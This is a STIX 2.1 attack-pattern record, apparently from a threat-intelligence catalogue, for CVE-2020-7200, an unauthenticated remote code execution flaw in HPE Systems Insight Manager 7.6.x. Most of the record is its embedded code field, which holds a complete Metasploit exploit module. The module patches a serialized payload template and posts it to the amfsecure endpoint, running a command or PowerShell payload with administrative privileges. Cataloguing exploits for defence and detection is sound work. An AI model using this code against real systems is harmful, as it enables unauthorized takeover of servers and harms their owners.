{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3032de32-5e0e-46ed-82a5-dc83f35f8e87",
    "created": "2024-08-14T16:51:57.595643Z",
    "modified": "2024-08-14T16:51:57.595646Z",
    "name": "HPE Systems Insight Manager AMF Deserialization RCE",
    "description": " A remotely exploitable vulnerability exists within HPE System Insight Manager (SIM) version 7.6.x that can be leveraged by a remote unauthenticated attacker to execute code within the context of HPE System Insight Manager's hpsimsvc.exe process, which runs with administrative privileges. The vulnerability occurs due to a failure to validate data during the deserialization process when a user submits a POST request to the /simsearch/messagebroker/amfsecure page. This module exploits this vulnerability by leveraging an outdated copy of Commons Collection, namely 3.2.2, that ships with HPE SIM, to gain RCE as the administrative user running HPE SIM. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/hpe_sim_76_amf_deserialization.rb",
            "external_id": "hpe_sim_76_amf_deserialization.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-7200"
        },
        {
            "source_name": "reference",
            "url": "https://testbnull.medium.com/hpe-system-insight-manager-sim-amf-deserialization-lead-to-rce-cve-2020-7200-d49a9cf143c0"
        },
        {
            "source_name": "reference",
            "url": "https://www.zerodayinitiative.com/advisories/ZDI-20-1449/"
        },
        {
            "source_name": "reference",
            "url": "https://support.hpe.com/hpesc/public/docDisplay?docLocale=en_US&docId=hpesbgn04068en_us"
        }
    ],
    "x_code_snippet": "# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Powershell\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'HPE Systems Insight Manager AMF Deserialization RCE',\n        'Description' => %q{\n          A remotely exploitable vulnerability exists within HPE System Insight Manager (SIM) version 7.6.x that can be\n          leveraged by a remote unauthenticated attacker to execute code within the context of HPE System Insight\n          Manager's hpsimsvc.exe process, which runs with administrative privileges. The vulnerability occurs due\n          to a failure to validate data during the deserialization process when a user submits a POST request to\n          the /simsearch/messagebroker/amfsecure page. This module exploits this vulnerability by leveraging an\n          outdated copy of Commons Collection, namely 3.2.2, that ships with HPE SIM, to gain\n          RCE as the administrative user running HPE SIM.\n        },\n        'Author' => [\n          'Harrison Neal', # Original bug finder, reported bug to ZDI\n          'Jang', # Aka @testanull on Twitter, editor of nightst0rm, who wrote a very detailed writeup of this bug in Vietnamese\n          'Grant Willcox' # Metasploit module author\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2020-7200'],\n          ['URL', 'https://testbnull.medium.com/hpe-system-insight-manager-sim-amf-deserialization-lead-to-rce-cve-2020-7200-d49a9cf143c0'],\n          ['URL', 'https://www.zerodayinitiative.com/advisories/ZDI-20-1449/'],\n          ['URL', 'https://support.hpe.com/hpesc/public/docDisplay?docLocale=en_US&docId=hpesbgn04068en_us']\n        ],\n        'Platform' => 'win',\n        'Targets' => [\n          [\n            'Windows Command',\n            {\n              'Arch' => ARCH_CMD,\n              'Type' => :windows_command,\n              'Space' => 64000\n            }\n          ],\n          [\n            'Windows Powershell',\n            {\n              'Arch' => [ARCH_X64],\n              'Type' => :windows_powershell,\n              'Space' => 64000\n            }\n          ]\n        ],\n        'DefaultOptions' => {\n          'RPORT' => 50000,\n          'SSL' => true\n        },\n        'DefaultTarget' => 1,\n        'DisclosureDate' => '2020-12-15',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => [REPEATABLE_SESSION]\n        },\n        'Privileged' => true\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [ true, 'The base path to the HPE SIM server', '/' ])\n    ])\n  end\n\n  def check\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path)\n    })\n    return CheckCode::Unknown('Failed to connect to the server.') if res.nil?\n\n    body = res.body\n    unless body.include?('Please insert your Smart Card and login to HPE System Insight Manager.') && body.include?('<title>HPE Systems Insight Manager</title>') && body.include?('/ui/javascript/XeHelp.js')\n      return CheckCode::Safe(\"Target doesn't appear to be a HPE System Insight Manager server!\")\n    end\n\n    data_dir = File.join(Msf::Config.data_directory, 'exploits', shortname)\n    f_handle = File.open(File.join(data_dir, 'emp.ser'), 'rb')\n    serialized_payload_content = f_handle.read\n    f_handle.close\n    serialized_payload_content_final = payload_template_adjustments(serialized_payload_content, 'a') # NOP command of a which will allow for checking if the target is vulnerable.\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'simsearch', 'messagebroker', 'amfsecure'),\n      'data' => serialized_payload_content_final\n    })\n\n    unless res&.code == 200\n      return CheckCode::Safe(\"Non-200 HTTP response received during deserialization. Target doesn't seem to be vulnerable!\")\n    end\n    unless res.to_s.include?('java.lang.NullPointerException')\n      return CheckCode::Safe(\"200 OK response didn't contain expected java.lang.NullPointerException. Target is not vulnerable!\")\n    end\n\n    CheckCode::Vulnerable('Target returned java.lang.NullPointerException in its 200 OK response!')\n  end\n\n  def exploit\n    case target['Type']\n    when :windows_command\n      execute_command(payload.encoded.gsub(/^powershell(?:\\.exe)* /, 'C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe ')) # If PowerShell is being used to run the command, specify the full path so that it will run correctly.\n    when :windows_powershell\n      execute_command(cmd_psh_payload(payload.encoded, payload.arch.first, remove_comspec: true).prepend('C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\')) # Need full path to PowerShell binary for it to run for some reason.\n    end\n  end\n\n  def payload_template_adjustments(original_content, cmd)\n    original_content['PAYLOAD'] = cmd\n    original_content[0x47A..0x47B] = [cmd.length].pack('n')\n    second_adjustment_length = original_content[0x3C..].length * 2\n\n    pack_array = []\n    current_number = second_adjustment_length\n    for count in 0...3\n      if current_number >> 7 == 0\n        break\n      else\n        if count == 2\n          pack_array.prepend((current_number >> 8) | 0x80)\n          break\n        else\n          pack_array.prepend((current_number >> 7) | 0x80)\n          current_number = current_number >> 7\n        end\n        count += 1\n      end\n    end\n    pack_array.append((second_adjustment_length & 0x7F) + 1)\n    original_content[0x3A..0x3B] = pack_array.pack('c*')\n\n    original_content\n  end\n\n  def execute_command(cmd, _opts = {})\n    data_dir = File.join(Msf::Config.data_directory, 'exploits', shortname)\n    f_handle = File.open(File.join(data_dir, 'emp.ser'), 'rb')\n    serialized_payload_content = f_handle.read\n    f_handle.close\n    serialized_payload_content_final = payload_template_adjustments(serialized_payload_content, cmd)\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'simsearch', 'messagebroker', 'amfsecure'),\n      'data' => serialized_payload_content_final\n    })\n\n    unless res&.code == 200\n      fail_with(Failure::UnexpectedReply, 'Non-200 HTTP response received while trying to execute the command')\n    end\n    unless res.to_s.include?('java.lang.NullPointerException')\n      fail_with(Failure::UnexpectedReply, 'Server should respond with a java.lang.NullPointerException upon successful deserialization, but no such message was received!')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-12-15",
    "x_mitre_platforms": [
        "win'"
    ]
}